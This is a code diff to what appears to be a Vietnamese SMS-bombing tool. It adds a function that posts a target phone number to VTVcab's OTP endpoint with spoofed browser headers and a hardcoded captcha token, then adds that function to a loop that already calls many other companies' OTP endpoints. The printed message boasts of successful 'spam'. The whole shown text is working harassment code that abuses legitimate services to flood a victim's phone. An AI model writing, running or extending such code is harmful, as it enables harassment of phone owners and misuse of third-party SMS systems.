@@ -70,6 +70,33 @@ formatted_device_id = format_device_id(random_id)
 #//////////////////////////
 import requests
 
+def send_otp_via_vtvcab(sdt):
+    headers = {
+        'accept': '*/*',
+        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+        'authorization': '',
+        'content-type': 'application/json',
+        'origin': 'https://vtvcab.vn',
+        'priority': 'u=1, i',
+        'referer': 'https://vtvcab.vn/',
+        'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
+    }
+
+    json_data = {
+        'phone': 'sdt',
+        'captchaToken': '0.IMEoirdkw_JKR0Q0FWu7WCQ4pkCmvjSv0lfYAiXMRfKTSGQ9FLn7SJFLZfOnmqsTIV7wv3O7zT3QL3GLTlZUnIy9GUWEPNlqpoA7WhyhY68AMWrMjjuJNnF2PT7UNA2DQgMQLD5-70JOeMwi1_rFkjO12lzbBKFTvucEXJhNWXMkYJWdVtNd8fnShBCskNPWIXfRptL1_dWlnoiYt15UNa8Vx4Gu6ivN2SAoF7IgcMPbsgT37weMqeW3QljvasmsExr7chwC2HZzU7PPwMhKxlWFpXKI1n6y86pUOcSK47rK43sFMZCN0KABC5g9PA_93mLNA20zRA4myslE4eKBTqd9xrwR_aSgRBvTpKm0oPmSkOPO3UIlp-ZGAtZjZKShHQa8qT-l-fifelEmXssFGkrIiQAt4itc32TrRCyrrQm6QrB2bzSz4n8cMsazQWFGgJBrT7dlNtsN8Ps9rdJAgQxPN7GEqwZzynnYhehbhbVJLMnVNC8LHXy71dhQM9JVIEkNDpdDtPhwdRo_fsmDOzp3efjDzHSEkNL5XRwmqQmC5n8wfhT6DF-d-IvXHoUR6zu6LkV9i8ujCaq9kryn3ptNtLlAoZkqUHQhd9KOoAUEH6vu2fEAiJtZl824xsz_KOXK1QhIVaR5AwqMAeDq13kOTzdQwDI7spSXXnGbtTR_sIUG5n_G0xuK5icYPenaJTilFKLaVBbO6lSQi0eyNKfO2N9aRa4UDx6SWr62uMVrnmN0KKm7L75peIwAgLpw9bxa8sicFttD79_jVM4jtRlf35ja4uPC6MvieYzws19T--VcBGhXoKzzLnAtuFUlfKda2M0bGgSvu_cGRkTg8L1nikkvkhMuh_J8aJ15cQDrLr1hTBJ8qhbHtAqaYkV6UQt0VtFah1lzhPzrrCsQbYjG45dCqdbzzhorVta-mX2swSFnFt90piyKdeRw3fcP.IIovgIHlYRu5oYkD7UyONg.f927a21d88d4336c27538fd54e123ff772a2cc5b1278113ef93e0a3c7df94676',
+    }
+
+    response = requests.post('https://apigateway.vtvcab.vn/mycab/api/v2/id/sync-otp', headers=headers, json=json_data)
+    print(f'[BY: CHÍ MUM] ~ VTVCAB SPAM THÀNH CÔNG')
+
+
 def send_otp_via_cashbar(sdt):
     cookies = {
         '_gcl_au': '1.1.998139933.1720624574',
@@ -3256,7 +3283,7 @@ import time
 
 def run(phone, i):
     functions = [
-        send_otp_via_cashbar,send_otp_via_pizzacompany,send_otp_via_sapo, send_otp_via_viettel, send_otp_via_medicare, send_otp_via_tv360,
+        send_otp_via_vtvcab,send_otp_via_cashbar,send_otp_via_pizzacompany,send_otp_via_sapo, send_otp_via_viettel, send_otp_via_medicare, send_otp_via_tv360,
         send_otp_via_dienmayxanh, send_otp_via_kingfoodmart, send_otp_via_mocha, send_otp_via_fptdk,
         send_otp_via_fptmk, send_otp_via_VIEON, send_otp_via_ghn, send_otp_via_lottemart,
         send_otp_via_DONGCRE, send_otp_via_shopee, send_otp_via_TGDD, send_otp_via_fptshop,
